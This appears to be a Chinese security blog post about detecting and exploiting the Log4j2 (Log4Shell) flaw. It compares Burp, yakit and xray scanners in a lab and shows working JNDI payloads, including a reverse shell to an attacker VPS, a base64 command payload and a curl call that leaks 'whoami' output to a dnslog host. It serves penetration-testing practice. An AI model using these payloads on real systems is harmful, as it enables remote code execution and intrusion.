#  【漏洞实战研磨】之细说log4j2   
原创 blue澜  小惜渗透   2025-02-10 10:10  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/gNBSibliblUwyftzDU3qicTIrqxJjHic6L20T4xalnGAwN2nMFricVVu4rpFdKrqbnILoAy3Vz1KZ1c9iatibnoVuBETw/640?from=appmsg&wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/JOETR6lhBcwEOSTRfQgiaSbAWOPzwz5IeCk6nQfZAt91RadHD1KC3Q7P4vAIjHdiaqcug6M4SvTIzt1LqoXmuNibQ/640?from=appmsg&wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/8WyGnsaODMVIR8icTXLJSGB3LlQMVaoBFXUas1H2oAszMFyCeauTJsUyoTicPl9F590E339OajvygRr85yshME7Q/640?from=appmsg&wx_fmt=gif "")  
  
say  
  
        最近工作生活学习和研究太多，时间着实有点不够用，而且有些文章现在由于某些因素还不能发还得等等，所以一直是静默状态。  
     
  
      ✅今天新启动一个合集，我为之起名叫【漏洞实战研磨】，这个我之前已经积攒了很多内容，不过一直没发而已。这个合集主要分享对于某个漏洞的细致打磨，比如一个漏洞，如何探测，探测有哪些方式，哪些方式好用，有哪些坑，以及重要的一点如何利用，利用过程又会存在哪些坑，以及对于这些漏洞的经验。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wGWEpySAHSrAiaTMVtoAQegc1kWnWRIuM3p0pQtn6FibQukZn4BaPaY2hoIOgz6IkAqswUNhibM3Ps7mUqiaEQYJCA/640?from=appmsg&wx_fmt=png "")  
  
  
  
🤔log4j2 Rce算是当年轰动一时的核弹级漏洞了，但是经过我亲身的种种经历表明这个nday利用率依然很高，很多大厂的公网资产我前阵子也挖到过，虽然漏洞存在，但是并不是每个人都能发现的，挖洞这东西需要天时地利人和🤣，干扰因素太多，可能有的时候就是别人幸运，你则挖不到😑，所以我写这篇文章来探寻记录一下目前针对该漏洞的探测和利用的最优解。  
### 1.1 探测  
  
✅log4j漏洞的Burp探测插件主流的就那么几款，接下来我分别介绍一下并尝试寻找最优的插件  
  
1️⃣**加载后界面如下，由于编译的时候是Log4j2Scan 0.13.1，所以就以这个版本命名**  
  
地址为：https://github.com/whwlsfb/Log4j2Scan（不建议使用）  
  
![image-20240812105457173](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv2XmVcqceHQVJL5CUzwVBgMuqP7X7y50XibA9h1IWaVfUje9DlSpdyiaQ/640?wx_fmt=png&from=appmsg "")  
  
有一说一这个插件写的还是很不错的，但是实际利用起来还是有一些问题，它可以设置poc格式和Fuzz的地方，但是我在实际使用的时候识别率较低并且发包量巨大，即便有它能识别出来的漏洞，估计也得个10分钟才能展现同时由于它抢占扫描流量，导致其它插件不起作用，如果你比较贪直接将poc和fuzz点满，那么恭喜你你的Burp插件全都静默了🫨，针对于这点你当然可以修改配置达到减少发包量，不过对于稍微不怎么注意这些插件配置和效果的师傅来讲就是个大坑了，毕竟当时我也是后知后觉才发现它的问题的😅  
  
![image-20240812105948855](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvkK3hmCVRFG7Iic8t9FhElYKZH9aq8dNGIctW0iaUvt4KMJWicibsPDe81Q/640?wx_fmt=png&from=appmsg "")  
  
2️⃣**然后也是我之前用了很长一段时间的（找不到地址了），就以log4j2Scan v0.7来命名吧**  
，如下所示，这个插件没有UI界面，查看output能看到具体的Scan信息，效率很高基本上秒出结果  
  
![image-20240812112118002](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvkicicuVbicbrLy6PDGYhg8ZPQ3mMOobv2UOlIicOPhXsVN2yB9dwRJMqjg/640?wx_fmt=png&from=appmsg "")  
  
可以看到它是通过dnslog.cn来判断的，当然很多大厂都已经屏蔽了dnslog.cn，甚至会直接拦截出现dnslog字样的请求  
  
![image-20240812131915245](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvg9LOzQDreIbTfxftibHKYudS1dfooCTJHEYb54Zg2ib4ibbPMZXLkyg0w/640?wx_fmt=png&from=appmsg "")  
  
所以我们做一个测试看看如果拦截dnslog.cn，这个插件还有没有用，我这里不通过iptables而是通过更改本地hosts来模拟，这样比较简单  
  
![image-20240812142236576](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv7ajr93CLYs2fdszxF0qxWguD1cW23FtBicVUFibwQBvY4qpAHTVHJicAw/640?wx_fmt=png&from=appmsg "")  
  
进入到靶场容器内部，确保dnslog.cn被解析到127.0.0.1  
  
![image-20240812142321325](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv4Ew0HOfWl3FQKjmbDb9CcR7ffibHF4BMib2FOTdwSKCqEV0nnSf80ZcQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到已经扫不出来了❌  
  
![image-20240812142758472](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvzq8bqRAcPqQnHNrJuiaYVIAj49K0yAawHkCwz4kyuas9yZCDwSEYiaqg/640?wx_fmt=png&from=appmsg "")  
  
于是，如果大厂屏蔽了dnslog.cn，就这样被错过了，然后我们可以改为下面的yakit继续验证  
  
3️⃣**yakit自带的插件**  
  
  
当我们更改工具，使用yakit里面的插件的时候如下图  
  
![image-20240812121541377](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv8zALEyVJ8DZkibuMRRh8ia0Pic1Y1pkEHbh8ibs4pUNM9yJEZUWFhyFAEw/640?wx_fmt=png&from=appmsg "")  
  
发现可以正常被扫描到，命中两条dnslog--> iyhc.eu.org  
和dgrh3.cn  
  
![image-20240812122109362](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvbC1bRWkLQUxyac2p66GgrFamf4kyYb9oLCJOsibuhnicyxP5On3TDrvQ/640?wx_fmt=png&from=appmsg "")  
  
那么我们继续，通过屏蔽这两个域名来看看如果屏蔽后，还能不能被扫描到，如下修改，这里由于像之前那样修改hosts不能用通配符，只能挨个子域名限制，所以这里改变一下策略，本地起一个dns，然后该靶场走这个dns服务器，具体怎么实现我就不多废话了有兴趣的自己研究吧，或者自己用java写一个，很可惜当我屏蔽了这些地址后，yakit也识别不出来了  
  
![image-20240812181517615](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv64ia62A4JZ6Hgy8hrf9J6j6ia9JZ7mPAAm7DFpwLjn6AtIdotdeEQ8Ew/640?wx_fmt=png&from=appmsg "")  
  
但是其实这里严格来说，yakit就够用了，因为像burp插件的dnslog.cn或者ceye.io这种被禁用的可能性很大，但是yakit的这两个域名其实可用性还是很高的，大部分厂家可能也不会禁用iyhc.eu.org  
和dgrh3.cn  
  
4️⃣**xray和Ez**  
  
其实像我这种平时用burp都用习惯了，测个系统测完为了防止上述情况，再用yakit跑一遍不太现实，但是相信很多师傅测试的时候都会用xray和Ez最后跑一遍，用来查缺补漏，所以这里再看下他们的效果  
  
他们扫描原理差不多，都得搭建返连平台，我这里以xray举例，返连平台建议参考：http://ktear.net/archives/xrayreverse  
  
秒出结果，使用xray来探测也是一个比较好的解决方案，不过就是需要公网服务器搭建返连平台  
  
![image-20240812205425591](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvGZuo68tFaVBY65EF0QanCDHgTHqy71qY1aib3eRdHiad7r98uUExBvEw/640?wx_fmt=png&from=appmsg "")  
  
5️⃣**log4jScan_Modify**  
  
https://github.com/r00tSe7en/log4jScan_Modify  
  
这个是一个魔改版的插件，识别方式就是自己公网vps启一个JNDIMonitor服务，然后这个插件需要将源码里面的监测地址改成自己的，然后自己编译  
  
### 1.2 利用  
  
利用的话可以使用的工具有很多，现有的有https://github.com/wyzxxz/jndi_tool  
  
利用的话直接vps启动ldap服务  
```
java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 "curl `whoami`.xxx.dnslog.cn"
```  
  
结果  
  
![image-20240819154422978](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWv8BRrIdvfAMWLSXV2qS0EicLfu0Er8bnhJlB5ibW9W0IFAFWMZFvmjzzw/640?wx_fmt=png&from=appmsg "")  
  
然后这里利用jndi_tool  
反弹shell的时候出错，同样的命令在靶场的docker容器里面直接执行就没问题，但是通过ldap却不行，判断应该是>  
符号导致的  
  
然后直接换工具利用JNDIExploit-1.4-SNAPSHOT.jar  
，用Basic/ReverseShell的payload反弹  
  
vps：  
```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i ip
```  
  
payload：  
```
${jndi:ldap://ldapip:1389/Basic/ReverseShell/反弹vps的ip/端口
```  
  
或者也可以用  
```
${jndi:ldap://ldapip:1389/Basic/Command/Base64/[base64_encoded_cmd]}
```  
  
反弹成功🎉  
  
![image-20240819155946400](https://mmbiz.qpic.cn/sz_mmbiz_png/mxIibC6HQFwxBzb4MtpicGqY6ZvWGfBPWvYOcYOBZTS9UdEPymVniaA5iahIt47zADoxMQ4o9icnGzmHSAWX3mO8wPA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dB8siaunhHjrNHg8sYVBcWg4fWXg7xZgVCUqPjPl4JJq1icnoRc6gSlYKYgqxMhRuhMfmWR5VyVpE5wADeMwj5IA/640 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/xCVyYvjFyj0KpMSFvRvJASxC4cHetibm3NcOl7JDQVSqlajDR9uGgC8FUw83DTZ3BzA74QbPfsN5jNtjqNN3ryA/640?wx_fmt=gif&from=appmsg "")  
  
  
[在渗透测试中开启透视外挂](https://mp.weixin.qq.com/s?__biz=Mzg3OTcxMjE2NQ==&mid=2247486862&idx=1&sn=7f4d20289e6d19f3182b71df5a42748d&scene=21#wechat_redirect)  
  
  
  
[小程序渗透 小程序sign逆向的两种思路](https://mp.weixin.qq.com/s?__biz=Mzg3OTcxMjE2NQ==&mid=2247487174&idx=1&sn=c0aa1f5fbfe6321d0408ee361c041d36&scene=21#wechat_redirect)  
  
  
  
[Nacos 0day（derby+源码）分析](https://mp.weixin.qq.com/s?__biz=Mzg3OTcxMjE2NQ==&mid=2247486997&idx=1&sn=033bad8f04a30ec56d735d5621f7b930&scene=21#wechat_redirect)  
  
  
